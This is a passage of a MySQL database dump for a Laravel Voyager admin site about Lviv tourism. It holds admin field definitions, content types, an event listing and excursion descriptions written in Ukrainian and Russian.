(261, 31, 'code', 'hidden', 'Код тега', 1, 1, 1, 1, 1, 1, NULL, 2),
(262, 31, 'created_at', 'timestamp', 'Created At', 0, 1, 1, 1, 0, 1, NULL, 3),
(263, 31, 'updated_at', 'timestamp', 'Updated At', 0, 0, 0, 0, 0, 0, NULL, 4),
(264, 31, 'name_uk', 'text', 'Name Uk', 0, 1, 1, 1, 1, 1, NULL, 3),
(265, 31, 'name_en', 'text', 'Name En', 0, 1, 1, 1, 1, 1, NULL, 4),
(268, 4, 'is_tag', 'hidden', 'Is Tag', 1, 1, 1, 1, 1, 1, NULL, 4),
(269, 4, 'name_uk', 'text', 'Name Uk', 1, 1, 1, 1, 1, 1, NULL, 6),
(270, 4, 'name_en', 'text', 'Name En', 1, 1, 1, 1, 1, 1, NULL, 7),
(377, 45, 'id', 'checkbox', 'Id', 1, 0, 0, 0, 0, 0, NULL, 1),
(378, 45, 'slider_name', 'select_dropdown', 'Slider Name', 1, 1, 1, 1, 1, 1, '{"default":"Головний слайдер","options":{"Головний слайдер":"Головний слайдер","Баннер подій":"Баннер подій"}}', 2),
(379, 45, 'image_url', 'image', 'Image Url', 0, 1, 1, 1, 1, 1, NULL, 3),
(380, 45, 'header', 'text', 'Header', 0, 1, 1, 1, 1, 1, NULL, 4),
(382, 45, 'url', 'text', 'Url', 0, 1, 1, 1, 1, 1, NULL, 6),
(383, 45, 'created_at', 'timestamp', 'Created At', 0, 1, 1, 1, 0, 1, NULL, 7),
(384, 45, 'updated_at', 'timestamp', 'Updated At', 0, 0, 0, 0, 0, 0, NULL, 8),
(385, 46, 'id', 'checkbox', 'Id', 1, 0, 0, 0, 0, 0, NULL, 1),
(386, 46, 'slider_name', 'checkbox', 'Slider Name', 1, 1, 1, 1, 1, 1, NULL, 2),
(387, 46, 'image_url', 'checkbox', 'Image Url', 0, 1, 1, 1, 1, 1, NULL, 3),
(388, 46, 'header', 'checkbox', 'Header', 0, 1, 1, 1, 1, 1, NULL, 4),
(389, 46, 'descripton', 'checkbox', 'Descripton', 0, 1, 1, 1, 1, 1, NULL, 5),
(390, 46, 'url', 'checkbox', 'Url', 0, 1, 1, 1, 1, 1, NULL, 6),
(391, 46, 'created_at', 'timestamp', 'Created At', 0, 1, 1, 1, 0, 1, NULL, 7),
(392, 46, 'updated_at', 'timestamp', 'Updated At', 0, 0, 0, 0, 0, 0, NULL, 8),
(393, 47, 'id', 'checkbox', 'Id', 1, 0, 0, 0, 0, 0, NULL, 1),
(394, 47, 'slider_name', 'checkbox', 'Slider Name', 1, 1, 1, 1, 1, 1, NULL, 2),
(395, 47, 'image_url', 'checkbox', 'Image Url', 0, 1, 1, 1, 1, 1, NULL, 3),
(396, 47, 'header', 'checkbox', 'Header', 0, 1, 1, 1, 1, 1, NULL, 4),
(397, 47, 'descripton', 'checkbox', 'Descripton', 0, 1, 1, 1, 1, 1, NULL, 5),
(398, 47, 'url', 'checkbox', 'Url', 0, 1, 1, 1, 1, 1, NULL, 6),
(399, 47, 'created_at', 'timestamp', 'Created At', 0, 1, 1, 1, 0, 1, NULL, 7),
(400, 47, 'updated_at', 'timestamp', 'Updated At', 0, 0, 0, 0, 0, 0, NULL, 8),
(401, 48, 'id', 'checkbox', 'Id', 1, 0, 0, 0, 0, 0, NULL, 1),
(402, 48, 'slider_name', 'checkbox', 'Slider Name', 1, 1, 1, 1, 1, 1, NULL, 2),
(403, 48, 'image_url', 'checkbox', 'Image Url', 0, 1, 1, 1, 1, 1, NULL, 3),
(404, 48, 'header', 'checkbox', 'Header', 0, 1, 1, 1, 1, 1, NULL, 4),
(405, 48, 'descripton', 'checkbox', 'Descripton', 0, 1, 1, 1, 1, 1, NULL, 5),
(406, 48, 'url', 'checkbox', 'Url', 0, 1, 1, 1, 1, 1, NULL, 6),
(407, 48, 'created_at', 'timestamp', 'Created At', 0, 1, 1, 1, 0, 1, NULL, 7),
(408, 48, 'updated_at', 'timestamp', 'Updated At', 0, 0, 0, 0, 0, 0, NULL, 8),
(409, 49, 'id', 'checkbox', 'Id', 1, 0, 0, 0, 0, 0, NULL, 1),
(410, 49, 'slider_name', 'checkbox', 'Slider Name', 1, 1, 1, 1, 1, 1, NULL, 2),
(411, 49, 'image_url', 'checkbox', 'Image Url', 0, 1, 1, 1, 1, 1, NULL, 3),
(412, 49, 'header', 'checkbox', 'Header', 0, 1, 1, 1, 1, 1, NULL, 4),
(413, 49, 'descripton', 'checkbox', 'Descripton', 0, 1, 1, 1, 1, 1, NULL, 5),
(414, 49, 'url', 'checkbox', 'Url', 0, 1, 1, 1, 1, 1, NULL, 6),
(415, 49, 'created_at', 'timestamp', 'Created At', 0, 1, 1, 1, 0, 1, NULL, 7),
(416, 49, 'updated_at', 'timestamp', 'Updated At', 0, 0, 0, 0, 0, 0, NULL, 8),
(417, 45, 'description', 'text', 'Description', 0, 1, 1, 1, 1, 1, NULL, 5),
(418, 45, 'link_text', 'text', 'Link Text', 0, 1, 1, 1, 1, 1, NULL, 7),
(419, 20, 'tag', 'select_dropdown', 'Tag', 1, 1, 1, 1, 1, 1, NULL, 13),
(420, 31, 'category_name', 'select_dropdown', 'Им\'я категорії', 1, 1, 1, 1, 1, 1, NULL, 3),
(423, 31, 'tag_belongsto_category_relationship', 'relationship', 'categories', 0, 1, 1, 1, 1, 1, '{"model":"App\\\\Category","table":"categories","type":"belongsTo","column":"category_name","key":"slug","label":"slug","pivot_table":"around_lvivs","pivot":"0"}', 5),
(424, 4, 'category_hasmany_tag_relationship', 'relationship', 'tags', 0, 1, 1, 1, 1, 1, '{"model":"App\\\\Tag","table":"tags","type":"hasMany","column":"category_name","key":"id","label":"category_name","pivot_table":"around_lvivs","pivot":"0"}', 8),
(427, 18, 'id', 'checkbox', 'Id', 1, 0, 0, 0, 0, 0, NULL, 1),
(428, 18, 'name_uk', 'text', 'Name Uk', 1, 1, 1, 1, 1, 1, NULL, 2),
(429, 18, 'name_en', 'text', 'Name En', 1, 1, 1, 1, 1, 1, NULL, 3),
(430, 18, 'address_uk', 'text', 'Address Uk', 1, 1, 1, 1, 1, 1, NULL, 5),
(431, 18, 'address_en', 'text', 'Address En', 1, 1, 1, 1, 1, 1, NULL, 6),
(432, 18, 'title_uk', 'text', 'Title Uk', 1, 1, 1, 1, 1, 1, NULL, 7),
(433, 18, 'title_en', 'text', 'Title En', 1, 1, 1, 1, 1, 1, NULL, 8),
(434, 18, 'post_uk', 'markdown_editor', 'Post Uk', 1, 1, 1, 1, 1, 1, NULL, 9),
(435, 18, 'post_en', 'markdown_editor', 'Post En', 1, 1, 1, 1, 1, 1, NULL, 10),
(436, 18, 'tag', 'select_dropdown', 'Tag', 1, 1, 1, 1, 1, 1, NULL, 12),
(437, 22, 'id', 'hidden', 'Id', 1, 0, 0, 0, 0, 0, NULL, 1),
(438, 22, 'tag', 'select_dropdown', 'Tag', 1, 1, 1, 1, 1, 1, NULL, 2),
(439, 22, 'name_uk', 'text', 'Name Uk', 1, 1, 1, 1, 1, 1, NULL, 3),
(440, 22, 'name_en', 'text', 'Name En', 1, 1, 1, 1, 1, 1, NULL, 4),
(441, 22, 'address_uk', 'text', 'Address Uk', 1, 1, 1, 1, 1, 1, NULL, 6),
(442, 22, 'address_en', 'text', 'Address En', 1, 1, 1, 1, 1, 1, NULL, 7),
(443, 22, 'title_uk', 'text', 'Title Uk', 1, 1, 1, 1, 1, 1, NULL, 8),
(444, 22, 'title_en', 'text', 'Title En', 1, 1, 1, 1, 1, 1, NULL, 9),
(445, 22, 'post_uk', 'text', 'Post Uk', 1, 1, 1, 1, 1, 1, NULL, 10),
(446, 22, 'post_en', 'text', 'Post En', 1, 1, 1, 1, 1, 1, NULL, 11),
(447, 12, 'tag', 'select_dropdown', 'Tag', 1, 1, 1, 1, 1, 1, NULL, 2),
(448, 12, 'name_uk', 'text', 'Name Uk', 1, 1, 1, 1, 1, 1, NULL, 4),
(449, 12, 'name_en', 'text', 'Name En', 1, 1, 1, 1, 1, 1, NULL, 5),
(450, 12, 'title_uk', 'text', 'Title Uk', 1, 1, 1, 1, 1, 1, NULL, 8),
(451, 12, 'title_en', 'text', 'Title En', 1, 1, 1, 1, 1, 1, NULL, 9),
(452, 12, 'post_uk', 'text', 'Post Uk', 1, 1, 1, 1, 1, 1, NULL, 10),
(453, 12, 'post_en', 'text', 'Post En', 1, 1, 1, 1, 1, 1, NULL, 11),
(454, 16, 'tag', 'select_dropdown', 'Tag', 1, 1, 1, 1, 1, 1, NULL, 2),
(455, 19, 'tag', 'select_dropdown', 'Tag', 1, 1, 1, 1, 1, 1, NULL, 2),
(456, 18, 'status', 'select_dropdown', 'Status', 1, 1, 1, 1, 1, 1, NULL, 18),
(457, 50, 'id', 'checkbox', 'Id', 1, 0, 0, 0, 0, 0, NULL, 1),
(458, 50, 'tag', 'text', 'Tag', 1, 1, 1, 1, 1, 1, NULL, 2),
(459, 50, 'name', 'text', 'Name', 1, 1, 1, 1, 1, 1, NULL, 3),
(460, 50, 'slug', 'text', 'Slug', 1, 1, 1, 1, 1, 1, NULL, 4),
(461, 50, 'date_on_off', 'text', 'Date On Off', 1, 1, 1, 1, 1, 1, NULL, 5),
(462, 50, 'time', 'text', 'Time', 1, 1, 1, 1, 1, 1, NULL, 6),
(463, 50, 'address', 'text', 'Address', 1, 1, 1, 1, 1, 1, NULL, 7),
(464, 50, 'number', 'text', 'Number', 1, 1, 1, 1, 1, 1, NULL, 8),
(465, 50, 'number2', 'text', 'Number2', 0, 1, 1, 1, 1, 1, NULL, 9),
(466, 50, 'email', 'text', 'Email', 1, 1, 1, 1, 1, 1, NULL, 10),
(468, 50, 'post', 'rich_text_box', 'Post', 0, 1, 1, 1, 1, 1, NULL, 12),
(469, 50, 'photo1', 'checkbox', 'Photo1', 0, 1, 1, 1, 1, 1, NULL, 13),
(470, 50, 'photo2', 'multiple_images', 'Photo2', 0, 1, 1, 1, 1, 1, NULL, 14),
(471, 50, 'photo3', 'checkbox', 'Photo3', 0, 1, 1, 1, 1, 1, NULL, 15),
(472, 50, 'banner_photo', 'multiple_images', 'Banner Photo', 1, 1, 1, 1, 1, 1, NULL, 16),
(473, 50, 'created_at', 'timestamp', 'Created At', 0, 1, 1, 1, 0, 1, NULL, 17),
(474, 50, 'updated_at', 'timestamp', 'Updated At', 0, 0, 0, 0, 0, 0, NULL, 18),
(475, 50, 'status', 'text', 'Status', 1, 1, 1, 1, 1, 1, NULL, 19),
(476, 52, 'id', 'checkbox', 'Id', 1, 0, 0, 0, 0, 0, NULL, 1),
(477, 52, 'tag', 'text', 'Tag', 1, 1, 1, 1, 1, 1, NULL, 2),
(478, 52, 'name', 'text', 'Name', 1, 1, 1, 1, 1, 1, NULL, 3),
(479, 52, 'slug', 'text', 'Slug', 1, 1, 1, 1, 1, 1, NULL, 4),
(480, 52, 'address', 'text', 'Address', 1, 1, 1, 1, 1, 1, NULL, 5),
(481, 52, 'number', 'text', 'Number', 1, 1, 1, 1, 1, 1, NULL, 6),
(482, 52, 'number2', 'text', 'Number2', 1, 1, 1, 1, 1, 1, NULL, 7),
(483, 52, 'email', 'text', 'Email', 1, 1, 1, 1, 1, 1, NULL, 8),
(484, 52, 'site', 'text', 'Site', 1, 1, 1, 1, 1, 1, NULL, 9),
(485, 52, 'schedule', 'text', 'Schedule', 1, 1, 1, 1, 1, 1, NULL, 10),
(487, 52, 'post', 'rich_text_box', 'Post', 1, 1, 1, 1, 1, 1, NULL, 12),
(488, 52, 'banner_photo', 'multiple_images', 'Banner Photo', 1, 1, 1, 1, 1, 1, NULL, 13),
(489, 52, 'photo1', 'multiple_images', 'Photo1', 1, 1, 1, 1, 1, 1, NULL, 14),
(490, 52, 'photo2', 'multiple_images', 'Photo2', 0, 1, 1, 1, 1, 1, NULL, 15),
(491, 52, 'photo3', 'multiple_images', 'Photo3', 0, 1, 1, 1, 1, 1, NULL, 16),
(492, 52, 'created_at', 'timestamp', 'Created At', 0, 1, 1, 1, 0, 1, NULL, 17),
(493, 52, 'updated_at', 'timestamp', 'Updated At', 0, 0, 0, 0, 0, 0, NULL, 18);

-- --------------------------------------------------------

--
-- Структура таблицы `data_types`
--

CREATE TABLE `data_types` (
  `id` int(10) UNSIGNED NOT NULL,
  `name` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `slug` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `display_name_singular` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `display_name_plural` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `icon` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `model_name` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `policy_name` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `controller` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `description` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `generate_permissions` tinyint(1) NOT NULL DEFAULT '0',
  `server_side` tinyint(4) NOT NULL DEFAULT '0',
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Дамп данных таблицы `data_types`
--

INSERT INTO `data_types` (`id`, `name`, `slug`, `display_name_singular`, `display_name_plural`, `icon`, `model_name`, `policy_name`, `controller`, `description`, `generate_permissions`, `server_side`, `created_at`, `updated_at`) VALUES
(1, 'posts', 'posts', 'Post', 'Posts', 'voyager-news', 'TCG\\Voyager\\Models\\Post', 'TCG\\Voyager\\Policies\\PostPolicy', NULL, NULL, 1, 0, '2018-04-05 09:40:10', '2018-04-18 15:24:07'),
(2, 'pages', 'pages', 'Page', 'Pages', 'voyager-file-text', 'TCG\\Voyager\\Models\\Page', NULL, '', '', 1, 0, '2018-04-05 09:40:12', '2018-04-05 09:40:12'),
(3, 'users', 'users', 'User', 'Users', 'voyager-person', 'TCG\\Voyager\\Models\\User', 'TCG\\Voyager\\Policies\\UserPolicy', NULL, NULL, 1, 0, '2018-04-05 09:40:12', '2018-04-19 11:39:56'),
(4, 'categories', 'categories', 'Category', 'Categories', 'voyager-categories', 'TCG\\Voyager\\Models\\Category', NULL, NULL, NULL, 1, 0, '2018-04-05 09:40:12', '2018-05-24 10:10:18'),
(5, 'menus', 'menus', 'Menu', 'Menus', 'voyager-list', 'TCG\\Voyager\\Models\\Menu', NULL, '', '', 1, 0, '2018-04-05 09:40:12', '2018-04-05 09:40:12'),
(6, 'roles', 'roles', 'Role', 'Roles', 'voyager-lock', 'TCG\\Voyager\\Models\\Role', NULL, '', '', 1, 0, '2018-04-05 09:40:13', '2018-04-05 09:40:13'),
(8, 'languages', 'languages', 'Language', 'Languages', NULL, 'App\\Language', NULL, NULL, NULL, 1, 0, '2018-04-19 07:40:27', '2018-04-19 07:40:27'),
(9, 'owners', 'owners', 'Owner', 'Owners', NULL, 'App\\Owner', NULL, NULL, NULL, 1, 0, '2018-04-19 07:40:35', '2018-04-19 07:40:35'),
(10, 'gids', 'gids', 'Gid', 'Gids', NULL, 'App\\Gid', NULL, NULL, NULL, 1, 0, '2018-04-19 08:01:55', '2018-04-23 07:49:44'),
(12, 'excursions', 'excursions', 'Excursion', 'Excursions', NULL, 'App\\Excursion', NULL, NULL, NULL, 1, 0, '2018-04-19 08:46:41', '2018-04-19 08:46:41'),
(16, 'museums', 'museums', 'Museum', 'Museums', NULL, 'App\\Museum', NULL, NULL, NULL, 1, 0, '2018-05-04 08:33:32', '2018-05-04 08:33:32'),
(18, 'memories', 'memories', 'Memory', 'Memories', NULL, 'App\\Memory', NULL, NULL, NULL, 1, 0, '2018-05-07 08:10:08', '2018-05-07 08:10:08'),
(19, 'public_places', 'public-places', 'Public Place', 'Public Places', NULL, 'App\\PublicPlace', NULL, NULL, NULL, 1, 0, '2018-05-07 09:59:27', '2018-05-07 09:59:27'),
(20, 'parks', 'parks', 'Park', 'Parks', NULL, 'App\\Park', NULL, NULL, NULL, 1, 0, '2018-05-07 11:10:56', '2018-05-07 11:10:56'),
(22, 'around_lvivs', 'around-lvivs', 'Around Lviv', 'Around Lvivs', NULL, 'App\\AroundLviv', NULL, NULL, NULL, 1, 0, '2018-05-11 06:01:15', '2018-05-11 06:01:15'),
(31, 'tags', 'tags', 'Tag', 'Tags', NULL, 'App\\Tag', NULL, NULL, NULL, 1, 0, '2018-05-24 09:31:19', '2018-05-24 09:31:19'),
(45, 'sliders', 'sliders', 'Slider', 'Sliders', NULL, 'App\\Slider', NULL, NULL, NULL, 1, 0, '2018-05-25 06:23:53', '2018-05-25 06:23:53'),
(46, 'sliders', 'sliders', 'Slider', 'Sliders', NULL, 'App\\Slider', NULL, NULL, NULL, 1, 0, '2018-05-25 06:24:41', '2018-05-25 06:24:41'),
(47, 'sliders', 'sliders', 'Slider', 'Sliders', NULL, 'App\\Slider', NULL, NULL, NULL, 1, 0, '2018-05-25 06:25:23', '2018-05-25 06:25:23'),
(48, 'sliders', 'sliders', 'Slider', 'Sliders', NULL, 'App\\Slider', NULL, NULL, NULL, 1, 0, '2018-05-25 06:26:21', '2018-05-25 06:26:21'),
(49, 'sliders', 'sliders', 'Slider', 'Sliders', NULL, 'App\\Slider', NULL, NULL, NULL, 1, 0, '2018-05-25 06:27:49', '2018-05-25 06:27:49'),
(50, 'developments', 'developments', 'Development', 'Developments', NULL, 'App\\Development', NULL, NULL, NULL, 1, 0, '2018-06-05 09:58:26', '2018-06-05 09:58:26'),
(52, 'theatres', 'theatres', 'Theatre', 'Theatres', NULL, 'App\\Theatre', NULL, NULL, NULL, 1, 0, '2018-06-05 11:20:38', '2018-06-05 11:20:38');

-- --------------------------------------------------------

--
-- Структура таблицы `developments`
--

CREATE TABLE `developments` (
  `id` int(10) UNSIGNED NOT NULL,
  `tag` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `name` varchar(255) NOT NULL,
  `slug` varchar(255) NOT NULL,
  `date_on_off` varchar(100) NOT NULL,
  `time` varchar(50) NOT NULL,
  `address` varchar(100) NOT NULL,
  `number` varchar(100) NOT NULL,
  `number2` varchar(100) DEFAULT NULL,
  `email` varchar(50) NOT NULL,
  `title` text NOT NULL,
  `post` text,
  `photo1` varchar(255) DEFAULT NULL,
  `photo2` varchar(255) DEFAULT NULL,
  `photo3` varchar(100) DEFAULT NULL,
  `banner_photo` varchar(255) NOT NULL,
  `created_at` timestamp NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `updated_at` timestamp NULL DEFAULT NULL,
  `status` enum('PUBLISHED','DRAFT','PENDING') NOT NULL DEFAULT 'DRAFT'
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Дамп данных таблицы `developments`
--

INSERT INTO `developments` (`id`, `tag`, `name`, `slug`, `date_on_off`, `time`, `address`, `number`, `number2`, `email`, `title`, `post`, `photo1`, `photo2`, `photo3`, `banner_photo`, `created_at`, `updated_at`, `status`) VALUES
(1, '', 'Концерт Arms and Sleepers: Find the Right Place', 'koncert-arms-and-sleepers', '20-25 Вересня 2018', '19:00', '!FESTrepublic (вул. Старознесенська, 24-26)', '0800507577', '0800507570', 'organizer@gmail.com', 'Американський електронний/тріп-хоп дуетArms and Sleepers за свою 11-річну історію видав 26 релізів – і тепер музиканти Макс Левіс (Бостон) та Мірза Рамік (Портленд) приїдуть до Львова із цією неймовірною компіляцією.', '<p>fvcflkvnflenvef;lv we;qlkmv \'[lwd;kfdlds;dx,kefv efqvefvefv ef</p>', 'developments/April2018/pEB0iixZAuE4oKQDBdg2.jpg', 'developments/April2018/8I01X37VvBdRUDX6pLkH.jpg', 'developments/April2018/IT8mC8YT6IC8nQQtkwD8.jpeg', 'developments/April2018/7baVchjGdE0BR89opUsZ.jpg', '2018-05-03 13:37:12', '2018-05-03 10:37:12', 'PUBLISHED');

-- --------------------------------------------------------

--
-- Структура таблицы `excursions`
--

CREATE TABLE `excursions` (
  `id` int(10) UNSIGNED NOT NULL,
  `tag` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `gid_id` int(11) NOT NULL,
  `name_uk` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `name_en` text COLLATE utf8_unicode_ci NOT NULL,
  `slug` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `status` enum('PUBLISHED','DRAFT','PENDING') COLLATE utf8_unicode_ci NOT NULL DEFAULT 'DRAFT',
  `title_uk` text COLLATE utf8_unicode_ci NOT NULL,
  `title_en` text COLLATE utf8_unicode_ci NOT NULL,
  `post_uk` text COLLATE utf8_unicode_ci NOT NULL,
  `post_en` text COLLATE utf8_unicode_ci NOT NULL,
  `photo` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `photo1` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `photo2` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `baner_photo` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `google_place_id` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `owner_email` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `unique_key` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Дамп данных таблицы `excursions`
--

INSERT INTO `excursions` (`id`, `tag`, `gid_id`, `name_uk`, `name_en`, `slug`, `status`, `title_uk`, `title_en`, `post_uk`, `post_en`, `photo`, `photo1`, `photo2`, `baner_photo`, `created_at`, `updated_at`, `google_place_id`, `owner_email`, `unique_key`) VALUES
(1, '', 8, 'Ботанический сад Львовского национального университета им. Ивана Франко', '', 'botanicheski-cad', 'PUBLISHED', 'Такого Львова Вы еще не видели! Львов — это не только уникальные архитектурные памятники, удивительные скульптуры и интересные кафе, Львов — это также город-парк с большими зелеными легкими и красивыми цветущими растениями.', '0', '<p><span style="color: #373737; font-family: \'Open Sans\', sans-serif; font-size: 15px; text-align: justify;">Такого Львова Вы еще не видели! Львов &mdash; это не только уникальные архитектурные памятники, удивительные скульптуры и интересные кафе, Львов &mdash; это&nbsp;</span><strong style="box-sizing: inherit; color: #373737; font-family: \'Open Sans\', sans-serif; font-size: 15px; text-align: justify;">также город-парк с большими зелеными легкими и красивыми цветущими растениями</strong><span style="color: #373737; font-family: \'Open Sans\', sans-serif; font-size: 15px; text-align: justify;">. С приходом весны Львов превращается в большой буяющий сад с подснежниками, крокусами, рододендронами, благоухающим жасмином &hellip; Всю эту цветущих красоту Вы должны увидеть на&nbsp;</span><a style="box-sizing: inherit; color: #373737; -webkit-tap-highlight-color: transparent; font-family: \'Open Sans\', sans-serif; font-size: 15px; text-align: justify;" href="http://lviv-tourist.info/ru/">экскурсии по Львову</a><span style="color: #373737; font-family: \'Open Sans\', sans-serif; font-size: 15px; text-align: justify;">! Поэтому для всех любителей дендропарков мы открываем двери в Ботанический сад Львова!</span><br style="box-sizing: inherit; color: #373737; font-family: \'Open Sans\', sans-serif; font-size: 15px; text-align: justify;" /><strong style="box-sizing: inherit; color: #373737; font-family: \'Open Sans\', sans-serif; font-size: 15px; text-align: justify;">Ботанический сад Львовского национального университета им. Ивана Франко</strong><span style="color: #373737; font-family: \'Open Sans\', sans-serif; font-size: 15px; text-align: justify;">&nbsp;&mdash; это один из первых ботанических садов Украины и Восточной Европы, открытый 1852. В его зеленой коллекции есть множество цветущих растений, в том числе &mdash; экзотических; здесь растут первоцветы, занесенные в красную Книгу Украины, а также &mdash; растения, подаренные известными людьми Украины.</span><br style="box-sizing: inherit; color: #373737; font-family: \'Open Sans\', sans-serif; font-size: 15px; text-align: justify;" /><span style="color: #373737; font-family: \'Open Sans\', sans-serif; font-size: 15px; text-align: justify;">Начиная с апреля и заканчивая последним месяцем лета,&nbsp;</span><strong style="box-sizing: inherit; color: #373737; font-family: \'Open Sans\', sans-serif; font-size: 15px; text-align: justify;">Ботанический сад</strong><span style="color: #373737; font-family: \'Open Sans\', sans-serif; font-size: 15px; text-align: justify;">&nbsp;&mdash; это рай для любителей цветущей природы. Первоцветы, анемоны, рододендроны, горицвет, форзиции, магнолии, древовидные пионы, различные сирени, тюльпанные деревья, ирисы, лилейники, розы, кувшинки, ковыль &hellip; &mdash; далеко не полный список удивительных растений Ботанического сада Львова.</span><br style="box-sizing: inherit; color: #373737; font-family: \'Open Sans\', sans-serif; font-size: 15px; text-align: justify;" /><span style="color: #373737; font-family: \'Open Sans\', sans-serif; font-size: 15px; text-align: justify;">Теперь эту всю цветущую красоту можно осмотреть каждый вторник и четверг, посетив экскурсию в&nbsp;</span><strong style="box-sizing: inherit; color: #373737; font-family: \'Open Sans\', sans-serif; font-size: 15px; text-align: justify;">Ботанический сад</strong><span style="color: #373737; font-family: \'Open Sans\', sans-serif; font-size: 15px; text-align: justify;">&nbsp;Львова. Квалифицированные работники-ботаники проведут увлекательную экскурсию угодьями этого уникального парко-сада, покажут удивительные растения и расскажут десятки увлекательных фактов о земной флоры.</span><br style="box-sizing: inherit; color: #373737; font-family: \'Open Sans\', sans-serif; font-size: 15px; text-align: justify;" /><span style="color: #373737; font-family: \'Open Sans\', sans-serif; font-size: 15px; text-align: justify;">Давайте любоваться &nbsp;природой вместе! Запись на экскурсию нужно делать заранее</span></p>', '0', 'excursions/April2018/INvo5Vs8Y9e7sYNdSNgn.jpg', 'excursions/April2018/CAgqVvae164F61FIWqBV.jpg', 'excursions/April2018/6hZMptJN7yLV8JjOf4lG.jpg', 'excursions/April2018/3F6NdWTxlrhQJxiSKrid.jpg', '2018-04-23 06:17:00', '2018-04-23 09:21:59', '0', '', ''),
(2, '', 3, 'Обзорная экскурсия по историческому центру Львова', '', 'obzornaya-ekskursiya-po-istoricheskomu-centru-l-vova', 'PUBLISHED', 'Лицензированный экскурсовод поведет Вам обзорную экскурсию по Львову древними средневековыми улочками и австрийскими проспектами, старыми кварталами, в частности русским, армянским, еврейским и знаменитой площадью Рынок, покажет ВСЕ популярные среди туристов архитектурные и скульптурные объекты, расскажет Вам о них и об образовании и развитие города Львова, документальные истории, мифы и веселые рассказы о прошлой жизни горожан', '0', '<div style="text-align: left;"><sup><span style="font-family: Arial, Helvetica, sans-serif; background-color: #ffffff;">Лицензированный экскурсовод поведет Вам обзорную экскурсию по Львову древними средневековыми улочками и австрийскими проспектами, старыми кварталами, в частности русским, армянским, еврейским и знаменитой площадью&nbsp;Рынок, покажет ВСЕ популярные среди туристов архитектурные и скульптурные объекты, расскажет Вам о них и об образовании&nbsp;и развитие города Львова, документальные истории, мифы и веселые рассказы о прошлой жизни горожан. Маршрут экскурсии: Оперный театр - Национальный Драматический театр им. М. Заньковецкой - Национальный музей - Рынок сувениров - Башня лавочников - Львовская статуя &laquo;Свободы&raquo; - проспект Свободы - Памятники поэтам Адаму Мицкевичу и Тарасу Шевченко - гостинице &laquo;Жорж&raquo; и &laquo;Европейский&raquo; - Латинский собор - Часовни Боимов и Кампианов - Костел и коллегиум иезуитов (+ интерьеры) - комплекс площади Рынок - кафе &laquo;Фреска&raquo; (+ интерьеры) - Армянский собор (+ интерьеры) и дворики - Дворцы: Бандинелли, Любомирских, К.Корнякта - Камяницы: Черная и Шольц-Вольфовичей - монастырь бернардинцев (+ интерьеры) - ансамбль Успенской церкви (+ интерьеры) - Доминиканский костел (+ интерьеры) - Пороховая башня - Оборонительные стены и бастионы - Городской и Королевский арсеналы - Памятники художнику Н. Дровняку, изобретателю керосиновой лампы Я.Зегу и И.Лукасевичу, казаку И.Пидкови, - Аптека-музей (+ интерьер) - Дом гауптвахты и &laquo;4 сезона&raquo; - мастерские Шоколада и Карамели&nbsp;&nbsp;</span><span class="copyright-span" style="box-sizing: border-box; font-family: Arial, Helvetica, sans-serif; background-color: #3699c5;"><br style="box-sizing: border-box;" /></span></sup></div>', '0', 'excursions/April2018/t9SgCND6qCKqGzfQf9HQ.jpg', 'excursions/April2018/8Z5Hqcm1t18lOoDFYqFQ.jpeg', 'excursions/April2018/IyoQhIn3nR0o3QU6YaDx.jpg', 'excursions/April2018/wtG3OSKTMXAoebIXhwLq.jpg', '2018-04-27 07:32:00', '2018-04-27 08:39:51', '0', '', '');

-- --------------------------------------------------------

--
-- Структура таблицы `gids`
--

CREATE TABLE `gids` (
  `id` int(10) UNSIGNED NOT NULL,
  `name_uk` varchar(50) COLLATE utf8_unicode_ci NOT NULL,
  `name_en` text COLLATE utf8_unicode_ci NOT NULL,
  `slug` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `email` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `number` text COLLATE utf8_unicode_ci NOT NULL,
  `number2` text COLLATE utf8_unicode_ci NOT NULL,
  `title_uk` text COLLATE utf8_unicode_ci NOT NULL,
  `title_en` text COLLATE utf8_unicode_ci NOT NULL,
  `post_uk` text COLLATE utf8_unicode_ci NOT NULL,
  `post_en` text COLLATE utf8_unicode_ci NOT NULL,
  `avatar` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `baner_photo` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Дамп данных таблицы `gids`
--

